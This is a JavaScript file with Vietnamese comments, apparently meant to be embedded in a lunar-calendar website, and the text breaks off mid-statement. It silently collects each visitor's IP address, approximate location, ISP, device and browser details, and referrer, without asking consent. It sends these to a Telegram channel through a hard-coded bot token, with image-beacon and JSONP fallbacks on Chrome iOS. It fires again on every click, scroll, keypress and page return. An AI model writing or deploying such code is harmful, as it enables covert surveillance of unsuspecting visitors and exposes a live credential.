/**
 * Mã tích hợp chức năng theo dõi người dùng cho lịch âm dương
 * Thu thập thông tin thiết bị, IP, vị trí, thời gian truy cập và gửi thông báo
 * Phiên bản: Chrome-iOS Compatible - Đặc biệt tối ưu cho Chrome trên iPhone
 */

// Cấu hình thông báo - Thay đổi thông tin này theo nhu cầu của bạn
const CONFIG = {
    // Cấu hình Telegram
    telegram: {
        enabled: true,
        botToken: '7625258398:AAHhBpc6wYwQNUmxATLMxBvTaAdYh_9sZ6k', // Thay thế bằng token của bot Telegram của bạn
        chatId: '@mybotchannelss'      // Thay thế bằng ID chat hoặc channel của bạn
    },
    
    // Cấu hình Email
    email: {
        enabled: true,
        service: 'emailjs', // 'emailjs', 'sendgrid', hoặc 'custom'
        recipient: 'your-email@example.com', // Thay thế bằng email của bạn
        
        // Cấu hình cho EmailJS
        emailjs: {
            userId: 'YOUR_EMAILJS_USER_ID',
            serviceId: 'YOUR_EMAILJS_SERVICE_ID',
            templateId: 'YOUR_EMAILJS_TEMPLATE_ID'
        },
        
        // Cấu hình cho SendGrid
        sendgrid: {
            apiKey: 'YOUR_SENDGRID_API_KEY'
        },
        
        // Cấu hình cho API tùy chỉnh
        custom: {
            apiUrl: 'https://your-custom-email-api.com/send',
            apiKey: 'YOUR_API_KEY',
            fromEmail: 'notifications@example.com',
            fromName: 'Lịch Âm Dương Notification'
        }
    },
    
    // Cấu hình webhook (tùy chọn, cho Discord, Slack, v.v.)
    webhook: {
        enabled: false,
        url: 'YOUR_WEBHOOK_URL'
    },
    
    // Cấu hình chung - Đã điều chỉnh cho Chrome trên iOS
    general: {
        // Thời gian chờ trước khi thu thập dữ liệu (ms)
        delay: 2000,
        
        // Luôn gửi thông báo mỗi khi có người truy cập
        notifyOncePerSession: false,
        
        // Không có thời gian chờ giữa các thông báo
        minTimeBetweenNotifications: 0,
        
        // Số lần thử lại nếu gửi thông báo thất bại
        maxRetries: 5,
        
        // Thời gian chờ giữa các lần thử lại (ms)
        retryDelay: 3000,
        
        // Bật chế độ gỡ lỗi
        debug: true,
        
        // Sử dụng phương pháp thay thế cho Chrome iOS
        useAlternativeMethodForChromeIOS: true,
        
        // Sử dụng localStorage để lưu trữ dữ liệu
        useLocalStorage: true,
        
        // Sử dụng Image beacon thay vì fetch API cho Chrome iOS
        useImageBeacon: true
    }
};

// Biến toàn cục để theo dõi trạng thái
let lastNotificationTime = 0;
let isTracking = false;
let retryCount = 0;
let debugLog = [];
let trackingAttempts = 0;
let isChromeIOS = false;

/**
 * Ghi log gỡ lỗi
 * @param {String} message - Thông điệp cần ghi
 * @param {Object} data - Dữ liệu bổ sung (tùy chọn)
 */
function logDebug(message, data = null) {
    if (CONFIG.general.debug) {
        const logEntry = {
            timestamp: new Date().toISOString(),
            message: message,
            data: data
        };
        
        debugLog.push(logEntry);
        console.log(`[DEBUG] ${message}`, data);
        
        // Giới hạn kích thước log
        if (debugLog.length > 100) {
            debugLog.shift();
        }
        
        // Lưu log vào localStorage nếu được bật
        if (CONFIG.general.useLocalStorage) {
            try {
                localStorage.setItem('trackingDebugLog', JSON.stringify(debugLog.slice(-20)));
            } catch (e) {
                console.error('Error saving debug log to localStorage:', e);
            }
        }
    }
}

/**
 * Phát hiện trình duyệt và thiết bị
 * @returns {Object} Thông tin về trình duyệt và thiết bị
 */
function detectBrowserAndDevice() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const vendor = navigator.vendor || '';
    
    const isIOS = /iPhone|iPad|iPod/i.test(ua);
    const isAndroid = /Android/i.test(ua);
    const isMobile = isIOS || isAndroid;
    
    const isSafari = /Safari/i.test(ua) && !/Chrome|Chromium/i.test(ua);
    const isChrome = /Chrome|Chromium/i.test(ua) && !/Edge|Edg|OPR|Opera/i.test(ua);
    const isFirefox = /Firefox/i.test(ua);
    const isEdge = /Edge|Edg/i.test(ua);
    
    // Chrome trên iOS thực chất là Safari với giao diện Chrome
    isChromeIOS = isIOS && isChrome;
    
    const result = {
        ua,
        platform,
        vendor,
        isIOS,
        isAndroid,
        isMobile,
        isSafari,
        isChrome,
        isFirefox,
        isEdge,
        isChromeIOS
    };
    
    logDebug('Browser and device detection', result);
    return result;
}

/**
 * Hàm thu thập thông tin vị trí của người dùng (chỉ dựa trên IP)
 * @returns {Promise} Promise chứa thông tin vị trí
 */
function getLocationInfo() {
    logDebug('Getting location info');
    return getIPBasedLocation()
        .then(locationData => {
            logDebug('Location data received', locationData);
            return {
                geoLocation: locationData,
                networkInfo: getNetworkInfo(),
                timestamp: new Date().toISOString()
            };
        })
        .catch(error => {
            logDebug('Error getting location info', error);
            return {
                error: 'Failed to collect location information',
                errorDetails: error.message,
                networkInfo: getNetworkInfo(),
                timestamp: new Date().toISOString()
            };
        });
}

/**
 * Lấy vị trí dựa trên IP mà không cần quyền từ người dùng
 * @returns {Promise} Promise chứa thông tin vị trí dựa trên IP
 */
function getIPBasedLocation() {
    // Sử dụng nhiều dịch vụ IP-to-location để tăng độ tin cậy
    const services = [
        { name: 'ipinfo.io', url: 'https://ipinfo.io/json' },
        { name: 'ipapi.co', url: 'https://ipapi.co/json/' },
        { name: 'ip-api.com', url: 'https://ip-api.com/json/' }
    ];
    
    logDebug('Trying IP-based location services');
    
    // Đối với Chrome trên iOS, sử dụng phương pháp thay thế
    if (isChromeIOS && CONFIG.general.useAlternativeMethodForChromeIOS) {
        return getLocationWithImageBeacon();
    }
    
    // Thử lần lượt các dịch vụ cho đến khi thành công
    return tryServices(services, 0);
}

/**
 * Sử dụng Image beacon để lấy thông tin vị trí (phương pháp thay thế cho Chrome iOS)
 * @returns {Promise} Promise chứa thông tin vị trí
 */
function getLocationWithImageBeacon() {
    logDebug('Using image beacon for location on Chrome iOS');
    
    return new Promise((resolve) => {
        // Tạo một ID duy nhất cho yêu cầu này
        const requestId = 'req_' + Math.random().toString(36).substring(2, 15);
        
        // Lưu callback vào window object để có thể gọi từ JSONP
        window[`ipCallback_${requestId}`] = function(data) {
            logDebug('Received data from image beacon', data);
            
            // Xóa script sau khi sử dụng
            const scriptElement = document.getElementById(`ip_script_${requestId}`);
            if (scriptElement) {
                document.head.removeChild(scriptElement);
            }
            
            // Xóa callback
            delete window[`ipCallback_${requestId}`];
            
            resolve({
                source: 'jsonp',
                ip: data.ip || 'Unknown',
                city: data.city || 'Unknown',
                region: data.region || 'Unknown',
                country: data.country_name || data.country || 'Unknown',
                latitude: data.latitude || null,
                longitude: data.longitude || null,
                timestamp: new Date().toISOString()
            });
        };
        
        // Tạo script element để tải JSONP
        const script = document.createElement('script');
        script.id = `ip_script_${requestId}`;
        script.src = `https://ipapi.co/jsonp?callback=ipCallback_${requestId}`;
        
        // Xử lý lỗi và timeout
        script.onerror = function() {
            logDebug('Error loading JSONP for location');
            delete window[`ipCallback_${requestId}`];
            
            // Fallback to basic info
            resolve({
                source: 'fallback',
                ip: 'Unknown',
                timestamp: new Date().toISOString()
            });
        };
        
        // Đặt timeout
        setTimeout(function() {
            if (window[`ipCallback_${requestId}`]) {
                logDebug('JSONP request timed out');
                delete window[`ipCallback_${requestId}`];
                
                // Fallback to basic info
                resolve({
                    source: 'timeout',
                    ip: 'Unknown',
                    timestamp: new Date().toISOString()
                });
                
                // Xóa script nếu vẫn tồn tại
                const scriptElement = document.getElementById(`ip_script_${requestId}`);
                if (scriptElement) {
                    document.head.removeChild(scriptElement);
                }
            }
        }, 5000);
        
        // Thêm script vào document
        document.head.appendChild(script);
    });
}

/**
 * Thử lần lượt các dịch vụ IP-to-location
 * @param {Array} services - Danh sách các dịch vụ cần thử
 * @param {Number} index - Chỉ số dịch vụ hiện tại
 * @returns {Promise} Promise chứa thông tin vị trí
 */
function tryServices(services, index) {
    if (index >= services.length) {
        logDebug('All location services failed');
        return Promise.resolve({
            source: 'Failed',
            error: 'All location services failed',
            timestamp: new Date().toISOString()
        });
    }
    
    const service = services[index];
    logDebug(`Trying location service: ${service.name}`);
    
    // Sử dụng XMLHttpRequest thay vì fetch cho Chrome iOS
    if (isChromeIOS && CONFIG.general.useAlternativeMethodForChromeIOS) {
        return new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', service.url, true);
            xhr.timeout = 5000; // 5 seconds timeout
            
            xhr.onload = function() {
                if (xhr.status >= 200 && xhr.status < 300) {
                    try {
                        const data = JSON.parse(xhr.responseText);
                        logDebug(`${service.name} returned data`, data);
                        resolve(processLocationData(data, service.name));
                    } catch (e) {
                        logDebug(`Error parsing ${service.name} response`, e);
                        reject(e);
                    }
                } else {
                    logDebug(`${service.name} responded with ${xhr.status}`);
                    reject(new Error(`${service.name} responded with ${xhr.status}`));
                }
            };
            
            xhr.onerror = function() {
                logDebug(`Network error with ${service.name}`);
                reject(new Error(`Network error with ${service.name}`));
            };
            
            xhr.ontimeout = function() {
                logDebug(`Timeout with ${service.name}`);
                reject(new Error(`Timeout with ${service.name}`));
            };
            
            xhr.send();
        })
        .catch(error => {
            logDebug(`Error with ${service.name}`, error);
            // Thử dịch vụ tiếp theo
            return tryServices(services, index + 1);
        });
    }
    
    // Sử dụng fetch API cho các trình duyệt khác
    return fetch(service.url)
        .then(response => {
            if (!response.ok) {
                throw new Error(`${service.name} responded with ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            logDebug(`${service.name} returned data`, data);
            return processLocationData(data, service.name);
        })
        .catch(error => {
            logDebug(`Error with ${service.name}`, error);
            // Thử dịch vụ tiếp theo
            return tryServices(services, index + 1);
        });
}

/**
 * Xử lý dữ liệu vị trí từ các dịch vụ khác nhau thành định dạng thống nhất
 * @param {Object} data - Dữ liệu vị trí từ dịch vụ
 * @param {String} source - Tên dịch vụ
 * @returns {Object} Dữ liệu vị trí đã chuẩn hóa
 */
function processLocationData(data, source) {
    let result = {
        source: source,
        timestamp: new Date().toISOString()
    };
    
    switch (source) {
        case 'ipinfo.io':
            result = {
                ...result,
                ip: data.ip,
                city: data.city || 'Unknown',
                region: data.region || 'Unknown',
                country: data.country || 'Unknown',
                postal: data.postal,
                timezone: data.timezone,
                org: data.org
            };
            
            // Phân tích tọa độ từ chuỗi "lat,lon"
            if (data.loc && data.loc.includes(',')) {
                const [lat, lon] = data.loc.split(',');
                result.latitude = parseFloat(lat);
                result.longitude = parseFloat(lon);
                result.accuracy = 10000; // Độ chính xác ước tính (mét)
            }
            break;
            
        case 'ipapi.co':
            result = {
                ...result,
                ip: data.ip,
                city: data.city || 'Unknown',
                region: data.region || 'Unknown',
                country: data.country_name || 'Unknown',
                postal: data.postal,
                timezone: data.timezone,
                org: data.org,
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: 10000 // Độ chính xác ước tính (mét)
            };
            break;
            
        case 'ip-api.com':
            result = {
                ...result,
                ip: data.query,
                city: data.city || 'Unknown',
                region: data.regionName || 'Unknown',
                country: data.country || 'Unknown',
                postal: data.zip,
                timezone: data.timezone,
                org: data.isp,
                latitude: data.lat,
                longitude: data.lon,
                accuracy: 10000 // Độ chính xác ước tính (mét)
            };
            break;
    }
    
    // Thêm địa chỉ dạng chuỗi
    if (result.city && result.country) {
        result.address = `${result.city}, ${result.region}, ${result.country}`;
    }
    
    return result;
}

/**
 * Lấy thông tin mạng mà không cần quyền từ người dùng
 * @returns {Object} Thông tin mạng
 */
function getNetworkInfo() {
    const networkInfo = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        online: navigator.onLine,
        platform: navigator.platform,
        timestamp: new Date().toISOString()
    };
    
    // Kiểm tra xem Network Information API có được hỗ trợ không
    const connection = navigator.connection || 
                      navigator.mozConnection || 
                      navigator.webkitConnection;
    
    if (connection) {
        networkInfo.connectionType = connection.type || 'Unknown';
        networkInfo.effectiveType = connection.effectiveType || 'Unknown';
        networkInfo.downlink = connection.downlink || 'Unknown';
        networkInfo.rtt = connection.rtt || 'Unknown';
        networkInfo.saveData = connection.saveData || false;
    }
    
    return networkInfo;
}

/**
 * Hàm chính để thu thập và gửi dữ liệu người dùng
 */
function trackUserAndNotify() {
    if (isTracking) {
        logDebug('Already tracking, skipping');
        return;
    }
    
    isTracking = true;
    trackingAttempts++;
    logDebug(`Starting user tracking (attempt ${trackingAttempts})`);
    
    // Thu thập thông tin thiết bị
    let deviceInfo;
    try {
        deviceInfo = getDeviceInfo();
        logDebug('Device info collected', deviceInfo);
    } catch (error) {
        logDebug('Error collecting device info', error);
        deviceInfo = { error: 'Failed to collect device info', userAgent: navigator.userAgent };
    }
    
    // Phương pháp thu thập dữ liệu cho Chrome iOS
    if (isChromeIOS && CONFIG.general.useAlternativeMethodForChromeIOS) {
        logDebug('Using alternative method for Chrome iOS');
        
        // Thu thập thông tin vị trí (chỉ dựa trên IP, không yêu cầu quyền)
        getLocationInfo()
            .then(locationInfo => {
                logDebug('Location info collected for Chrome iOS', locationInfo);
                
                // Thu thập thông tin thời gian truy cập
                let accessTime;
                try {
                    accessTime = getAccessTime();
                    logDebug('Access time collected', accessTime);
                } catch (error) {
                    logDebug('Error collecting access time', error);
                    accessTime = { timestamp: new Date().toISOString(), error: 'Failed to collect detailed access time' };
                }
                
                // Tổng hợp tất cả dữ liệu
                const userData = {
                    deviceInfo: deviceInfo,
                    ipInfo: locationInfo.geoLocation,
                    locationInfo: locationInfo,
                    accessTime: accessTime,
                    pageInfo: {
                        url: window.location.href,
                        title: document.title,
                        referrer: document.referrer
                    },
                    debugInfo: CONFIG.general.debug ? {
                        logs: debugLog.slice(-10),
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        vendor: navigator.vendor,
                        isChromeIOS: isChromeIOS,
                        trackingAttempts: trackingAttempts
                    } : null
                };
                
                // Lưu dữ liệu vào localStorage
                if (CONFIG.general.useLocalStorage) {
                    try {
                        localStorage.setItem('trackingData', JSON.stringify(userData));
                        localStorage.setItem('lastTrackingTime', Date.now().toString());
                        logDebug('User data saved to localStorage');
                    } catch (e) {
                        logDebug('Error saving to localStorage', e);
                    }
                }
                
                // Gửi thông báo với dữ liệu đã thu thập
                sendNotificationsForChromeIOS(userData)
                    .then(result => {
                        logDebug('Notifications sent for Chrome iOS', result);
                        isTracking = false;
                        retryCount = 0;
                        lastNotificationTime = Date.now();
                    })
                    .catch(error => {
                        logDebug('Error sending notifications for Chrome iOS', error);
                        isTracking = false;
                        
                        // Thử lại nếu chưa đạt số lần thử tối đa
                        if (retryCount < CONFIG.general.maxRetries) {
                            retryCount++;
                            logDebug(`Retrying (${retryCount}/${CONFIG.general.maxRetries}) in ${CONFIG.general.retryDelay}ms`);
                            setTimeout(() => {
                                sendNotificationsForChromeIOS(userData);
                            }, CONFIG.general.retryDelay);
                        } else {
                            retryCount = 0;
                            logDebug('Max retries reached, giving up');
                        }
                    });
                
                return userData;
            })
            .catch(error => {
                logDebug('Error in Chrome iOS tracking', error);
                isTracking = false;
            });
        
        return;
    }
    
    // Phương pháp thu thập dữ liệu cho các trình duyệt khác
    getIPAddress()
        .then(ipInfo => {
            logDebug('IP info collected', ipInfo);
            
            // Thu thập thông tin vị trí (chỉ dựa trên IP, không yêu cầu quyền)
            return getLocationInfo()
                .then(locationInfo => {
                    logDebug('Location info collected', locationInfo);
                    
                    // Thu thập thông tin thời gian truy cập
                    let accessTime;
                    try {
                        accessTime = getAccessTime();
                        logDebug('Access time collected', accessTime);
                    } catch (error) {
                        logDebug('Error collecting access time', error);
                        accessTime = { timestamp: new Date().toISOString(), error: 'Failed to collect detailed access time' };
                    }
                    
                    // Tổng hợp tất cả dữ liệu
                    const userData = {
                        deviceInfo: deviceInfo,
                        ipInfo: ipInfo,
                        locationInfo: locationInfo,
                        accessTime: accessTime,
                        pageInfo: {
                            url: window.location.href,
                            title: document.title,
                            referrer: document.referrer
                        },
                        debugInfo: CONFIG.general.debug ? {
                            logs: debugLog.slice(-10),
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            vendor: navigator.vendor,
                            isChromeIOS: isChromeIOS,
                            trackingAttempts: trackingAttempts
                        } : null
                    };
                    
                    // Lưu dữ liệu vào localStorage
                    if (CONFIG.general.useLocalStorage) {
                        try {
                            localStorage.setItem('trackingData', JSON.stringify(userData));
                            localStorage.setItem('lastTrackingTime', Date.now().toString());
                            logDebug('User data saved to localStorage');
                        } catch (e) {
                            logDebug('Error saving to localStorage', e);
                        }
                    }
                    
                    // Gửi thông báo với dữ liệu đã thu thập
                    sendNotifications(userData)
                        .then(result => {
                            logDebug('Notifications sent', result);
                            isTracking = false;
                            retryCount = 0;
                            lastNotificationTime = Date.now();
                        })
                        .catch(error => {
                            logDebug('Error sending notifications', error);
                            isTracking = false;
                            
                            // Thử lại nếu chưa đạt số lần thử tối đa
                            if (retryCount < CONFIG.general.maxRetries) {
                                retryCount++;
                                logDebug(`Retrying (${retryCount}/${CONFIG.general.maxRetries}) in ${CONFIG.general.retryDelay}ms`);
                                setTimeout(() => {
                                    sendNotifications(userData);
                                }, CONFIG.general.retryDelay);
                            } else {
                                retryCount = 0;
                                logDebug('Max retries reached, giving up');
                            }
                        });
                    
                    return userData;
                })
                .catch(error => {
                    logDebug('Error in location tracking', error);
                    isTracking = false;
                });
        })
        .catch(error => {
            logDebug('Error in IP tracking', error);
            isTracking = false;
        });
}

/**
 * Gửi thông báo qua tất cả các kênh được cấu hình (phương pháp đặc biệt cho Chrome iOS)
 * @param {Object} userData - Dữ liệu người dùng đã thu thập
 * @returns {Promise} Promise chứa kết quả gửi thông báo
 */
function sendNotificationsForChromeIOS(userData) {
    logDebug('Sending notifications for Chrome iOS');
    const promises = [];
    
    // Gửi thông báo qua Telegram nếu được bật
    if (CONFIG.telegram.enabled) {
        logDebug('Sending Telegram notification for Chrome iOS');
        promises.push(
            sendTelegramNotificationWithImage(
                userData,
                CONFIG.telegram.botToken,
                CONFIG.telegram.chatId
            ).then(result => {
                logDebug('Telegram notification result for Chrome iOS', result);
                return { service: 'telegram', result };
            }).catch(error => {
                logDebug('Telegram notification error for Chrome iOS', error);
                return { service: 'telegram', error };
            })
        );
    }
    
    // Gửi thông báo qua Email nếu được bật
    if (CONFIG.email.enabled) {
        logDebug('Sending Email notification for Chrome iOS');
        promises.push(
            sendEmailNotificationWithImage(
                userData,
                CONFIG.email.recipient,
                CONFIG.email.service === 'emailjs' ? CONFIG.email.emailjs : 
                CONFIG.email.service === 'sendgrid' ? CONFIG.email.sendgrid : 
                CONFIG.email.custom
            ).then(result => {
                logDebug('Email notification result for Chrome iOS', result);
                return { service: 'email', result };
            }).catch(error => {
                logDebug('Email notification error for Chrome iOS', error);
                return { service: 'email', error };
            })
        );
    }
    
    // Nếu không có dịch vụ nào được bật, trả về lỗi
    if (promises.length === 0) {
        logDebug('No notification services enabled for Chrome iOS');
        return Promise.reject(new Error('No notification services enabled'));
    }
    
    // Đợi tất cả các thông báo hoàn thành
    return Promise.all(promises);
}

/**
 * Gửi thông báo Telegram sử dụng Image beacon (cho Chrome iOS)
 * @param {Object} userData - Dữ liệu người dùng đã thu thập
 * @param {String} botToken - Token của Telegram Bot
 * @param {String} chatId - ID của chat hoặc channel để gửi tin nhắn
 * @returns {Promise} Promise chứa kết quả gửi tin nhắn
 */
function sendTelegramNotificationWithImage(userData, botToken, chatId) {
    logDebug('Using image beacon for Telegram notification');
    
    return new Promise((resolve, reject) => {
        try {
            // Định dạng dữ liệu thành chuỗi dễ đọc
            const formattedData = formatDataForTelegram(userData);
            
            // Mã hóa dữ liệu để sử dụng trong URL
            const encodedText = encodeURIComponent(formattedData);
            
            // URL API của Telegram Bot
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedText}&parse_mode=HTML`;
            
            // Tạo một image element để gửi yêu cầu
            const img = new Image();
            
            // Xử lý khi tải thành công
            img.onload = function() {
                logDebug('Telegram notification sent successfully via image');
                resolve({
                    success: true,
                    timestamp: new Date().toISOString()
                });
            };
            
            // Xử lý khi có lỗi
            img.onerror = function() {
                logDebug('Error sending Telegram notification via image');
                
                // Thử phương pháp JSONP
                const script = document.createElement('script');
                const callbackName = 'tgCallback_' + Math.random().toString(36).substring(2, 15);
                
                // Tạo callback
                window[callbackName] = function(data) {
                    logDebug('Telegram JSONP response', data);
                    delete window[callbackName];
                    document.head.removeChild(script);
                    
                    if (data && data.ok) {
                        resolve({
                            success: true,
                            timestamp: new Date().toISOString()
                        });
                    } else {
                        reject(new Error('Telegram JSONP request failed'));
                    }
                };
                
                // Đặt timeout
                setTimeout(function() {
                    if (window[callbackName]) {
                        delete window[callbackName];
                        document.head.removeChild(script);
                        reject(new Error('Telegram JSONP request timed out'));
                    }
                }, 10000);
                
                // Tạo URL với callback
                script.src = `${apiUrl}&callback=${callbackName}`;
                document.head.appendChild(script);
            };
            
            // Gửi yêu cầu
            img.src = apiUrl;
            
            // Đặt timeout
            setTimeout(function() {
                if (!img.complete) {
                    logDebug('Telegram image request timed out');
                    img.onload = null;
                    img.onerror = null;
                    reject(new Error('Telegram image request timed out'));
                }
            }, 10000);
        } catch (error) {
            logDebug('Error in sendTelegramNotificationWithImage', error);
            reject(error);
        }
    });
}

/**
 * Gửi thông báo Email sử dụng Image beacon (cho Chrome iOS)
 * @param {Object} userData - Dữ liệu người dùng đã thu thập
 * @param {String} emailTo - Địa chỉ email nhận thông báo
 * @param {Object} emailConfig - Cấu hình email
 * @returns {Promise} Promise chứa kết quả gửi email
 */
function sendEmailNotificationWithImage(userData, emailTo, emailConfig) {
    logDebug('Using alternative method for Email notification');
    
    // Tạo một proxy URL để gửi email
    // Lưu ý: Đây là một giải pháp giả định, bạn cần tạo một endpoint thực tế để xử lý yêu cầu này
    const proxyUrl = 'https://your-email-proxy-service.com/send-email';
    
    // Chuẩn bị dữ liệu
    const emailData = {
        to: emailTo,
        subject: `Thông báo truy cập lịch âm dương - ${new Date().toLocaleString()}`,
        userData: JSON.stringify(userData)
    };
    
    // Mã hóa dữ liệu để sử dụng trong URL
    const params = Object.keys(emailData)
        .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(emailData[key])}`)
        .join('&');
    
    return new Promise((resolve, reject) => {
        try {
            // Tạo một image element để gửi yêu cầu
            const img = new Image();
            
            // Xử lý khi tải thành công
            img.onload = function() {
                logDebug('Email notification sent successfully via image');
                resolve({
                    success: true,
                    timestamp: new Date().toISOString()
                });
            };
            
            // Xử lý khi có lỗi
            img.onerror = function() {
                logDebug('Error sending Email notification via image');
                
                // Lưu dữ liệu vào localStorage để thử lại sau
                if (CONFIG.general.useLocalStorage) {
                    try {
                        const pendingEmails = JSON.parse(localStorage.getItem('pendingEmails') || '[]');
                        pendingEmails.push({
                            data: emailData,
                            timestamp: new Date().toISOString()
                        });
                        localStorage.setItem('pendingEmails', JSON.stringify(pendingEmails));
                        logDebug('Email data saved to localStorage for later retry');
                        
                        resolve({
                            success: false,
                            saved: true,
                            timestamp: new Date().toISOString()
                        });
                    } catch (e) {
                        logDebug('Error saving email data to localStorage', e);
                        reject(e);
                    }
                } else {
                    reject(new Error('Email notification failed'));
                }
            };
            
            // Gửi yêu cầu
            img.src = `${proxyUrl}?${params}`;
            
            // Đặt timeout
            setTimeout(function() {
                if (!img.complete) {
                    logDebug('Email image request timed out');
                    img.onload = null;
                    img.onerror = null;
                    
                    // Lưu dữ liệu vào localStorage để thử lại sau
                    if (CONFIG.general.useLocalStorage) {
                        try {
                            const pendingEmails = JSON.parse(localStorage.getItem('pendingEmails') || '[]');
                            pendingEmails.push({
                                data: emailData,
                                timestamp: new Date().toISOString()
                            });
                            localStorage.setItem('pendingEmails', JSON.stringify(pendingEmails));
                            logDebug('Email data saved to localStorage for later retry (timeout)');
                            
                            resolve({
                                success: false,
                                saved: true,
                                timestamp: new Date().toISOString()
                            });
                        } catch (e) {
                            logDebug('Error saving email data to localStorage', e);
                            reject(e);
                        }
                    } else {
                        reject(new Error('Email image request timed out'));
                    }
                }
            }, 10000);
        } catch (error) {
            logDebug('Error in sendEmailNotificationWithImage', error);
            reject(error);
        }
    });
}

/**
 * Gửi thông báo qua tất cả các kênh được cấu hình
 * @param {Object} userData - Dữ liệu người dùng đã thu thập
 * @returns {Promise} Promise chứa kết quả gửi thông báo
 */
function sendNotifications(userData) {
    logDebug('Sending notifications');
    const promises = [];
    
    // Gửi thông báo qua Telegram nếu được bật
    if (CONFIG.telegram.enabled) {
        logDebug('Sending Telegram notification');
        promises.push(
            sendTelegramNotification(
                userData,
                CONFIG.telegram.botToken,
                CONFIG.telegram.chatId
            ).then(result => {
                logDebug('Telegram notification result', result);
                return { service: 'telegram', result };
            }).catch(error => {
                logDebug('Telegram notification error', error);
                return { service: 'telegram', error };
            })
        );
    }
    
    // Gửi thông báo qua Email nếu được bật
    if (CONFIG.email.enabled) {
        let emailConfig;
        
        // Xác định cấu hình email dựa trên dịch vụ
        switch (CONFIG.email.service) {
            case 'emailjs':
                emailConfig = {
                    service: 'emailjs',
                    ...CONFIG.email.emailjs
                };
                break;
            case 'sendgrid':
                emailConfig = {
                    service: 'sendgrid',
                    apiKey: CONFIG.email.sendgrid.apiKey
                };
                break;
            case 'custom':
                emailConfig = {
                    service: 'custom',
                    ...CONFIG.email.custom
                };
                break;
        }
        
        logDebug('Sending Email notification');
        promises.push(
            sendEmailNotification(
                userData,
                CONFIG.email.recipient,
                emailConfig
            ).then(result => {
                logDebug('Email notification result', result);
                return { service: 'email', result };
            }).catch(error => {
                logDebug('Email notification error', error);
                return { service: 'email', error };
            })
        );
    }
    
    // Gửi thông báo qua webhook nếu được bật
    if (CONFIG.webhook.enabled) {
        logDebug('Sending Webhook notification');
        promises.push(
            sendWebhookNotification(
                userData,
                CONFIG.webhook.url
            ).then(result => {
                logDebug('Webhook notification result', result);
                return { service: 'webhook', result };
            }).catch(error => {
                logDebug('Webhook notification error', error);
                return { service: 'webhook', error };
            })
        );
    }
    
    // Nếu không có dịch vụ nào được bật, trả về lỗi
    if (promises.length === 0) {
        logDebug('No notification services enabled');
        return Promise.reject(new Error('No notification services enabled'));
    }
    
    // Đợi tất cả các thông báo hoàn thành
    return Promise.all(promises);
}

/**
 * Khởi tạo theo dõi người dùng
 */
function initUserTracking() {
    logDebug('Initializing user tracking');
    
    // Phát hiện trình duyệt và thiết bị
    const browserInfo = detectBrowserAndDevice();
    
    // Kiểm tra xem trình duyệt có hỗ trợ các API cần thiết không
    const browserSupport = {
        fetch: typeof fetch !== 'undefined',
        promise: typeof Promise !== 'undefined',
        json: typeof JSON !== 'undefined',
        localStorage: (function() {
            try {
                localStorage.setItem('test', 'test');
                localStorage.removeItem('test');
                return true;
            } catch (e) {
                return false;
            }
        })()
    };
    
    logDebug('Browser support check', browserSupport);
    
    // Khôi phục log từ localStorage nếu có
    if (CONFIG.general.useLocalStorage && browserSupport.localStorage) {
        try {
            const savedLog = localStorage.getItem('trackingDebugLog');
            if (savedLog) {
                const parsedLog = JSON.parse(savedLog);
                if (Array.isArray(parsedLog)) {
                    debugLog = parsedLog;
                    logDebug('Restored debug log from localStorage', { logSize: debugLog.length });
                }
            }
        } catch (e) {
            console.error('Error restoring debug log from localStorage:', e);
        }
    }
    
    // Điều chỉnh cấu hình dựa trên thiết bị
    if (browserInfo.isMobile) {
        // Tăng thời gian chờ cho thiết bị di động
        CONFIG.general.delay = browserInfo.isIOS ? 2000 : 1500;
        logDebug('Adjusted delay for mobile device', CONFIG.general.delay);
    }
    
    // Điều chỉnh cấu hình đặc biệt cho Chrome iOS
    if (browserInfo.isChromeIOS) {
        CONFIG.general.delay = 2500;
        CONFIG.general.retryDelay = 3000;
        CONFIG.general.maxRetries = 5;
        logDebug('Adjusted configuration for Chrome iOS', {
            delay: CONFIG.general.delay,
            retryDelay: CONFIG.general.retryDelay,
            maxRetries: CONFIG.general.maxRetries
        });
    }
    
    // Chờ một khoảng thời gian trước khi bắt đầu theo dõi
    setTimeout(() => {
        trackUserAndNotify();
        
        // Thiết lập theo dõi phiên
        try {
            const sessionTracker = trackSessionDuration();
            logDebug('Session tracking initialized');
        } catch (error) {
            logDebug('Error initializing session tracking', error);
        }
        
        // Thiết lập kiểm tra định kỳ cho Chrome iOS
        if (browserInfo.isChromeIOS) {
            setInterval(() => {
                const now = Date.now();
                const lastTime = parseInt(localStorage.getItem('lastTrackingTime') || '0', 10);
                
                // Nếu đã quá 5 phút kể từ lần cuối cùng, thử lại
                if (now - lastTime > 300000 && !isTracking) {
                    logDebug('Periodic check for Chrome iOS - retrying tracking');
                    trackUserAndNotify();
                }
            }, 60000); // Kiểm tra mỗi phút
        }
    }, CONFIG.general.delay);
}

// Theo dõi khi người dùng quay lại trang
document.addEventListener('visibilitychange', function() {
    logDebug('Visibility changed', { visibilityState: document.visibilityState });
    if (document.visibilityState === 'visible') {
        // Người dùng quay lại trang, gửi thông báo
        setTimeout(trackUserAndNotify, 1000);
    }
}, { passive: true });

// Theo dõi khi trang được tải lại
window.addEventListener('pageshow', function(event) {
    logDebug('Page show event', { persisted: event.persisted });
    // Kiểm tra nếu trang được tải từ bộ nhớ cache (back/forward)
    if (event.persisted) {
        setTimeout(trackUserAndNotify, 1000);
    }
}, { passive: true });

// Theo dõi khi người dùng tương tác với trang
['touchstart', 'touchend', 'click', 'scroll', 'keypress'].forEach(function(eventType) {
    document.addEventListener(eventType, function() {
        // Kiểm tra xem đã đủ thời gian kể từ lần thông báo cuối cùng chưa
        const now = Date.now();
        // Thêm một khoảng thời gian nhỏ (5 giây) để tránh gửi quá nhiều thông báo
        if (now - lastNotificationTime > 5000 && !isTracking) {
            logDebug(`User interaction detected: ${eventType}`);
            setTimeout(trackUserAndNotify, 1000);
        }
    }, { passive: true });
});

// Thêm sự kiện cho thiết bị di động
if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
